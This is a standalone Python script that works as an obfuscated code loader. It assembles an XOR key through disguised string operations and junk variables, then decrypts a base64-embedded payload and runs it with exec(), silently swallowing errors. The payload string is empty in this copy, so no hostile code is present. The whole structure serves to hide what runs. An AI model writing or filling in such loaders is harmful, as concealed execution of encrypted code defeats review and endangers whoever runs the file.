#!/usr/bin/env python3
import sys
import base64

def _calc(data, key):
    kb = key.encode()
    kl = len(kb)
    r = bytearray()
    for i, b in enumerate(data):
        r.append(b ^ kb[i % kl])
    return bytes(r)

def _init():
    j = ''.join(['Z','y'])
    _temp = len('hello')
    _temp = 90 + 53
    t = bytes.fromhex('6e4e').decode()
    item = __import__('base64').b64decode('QjY2Ng==').decode()
    _auth = '{}{}{}'.format(j,t,item)
    
    e = ""
    ed = base64.b64decode(e)
    
    try:
        dd = _calc(ed, _auth)
        dc = dd.decode()
        exec(dc, {'__name__': '__main__'})
    except:
        pass

if __name__ == "__main__":
    _init()
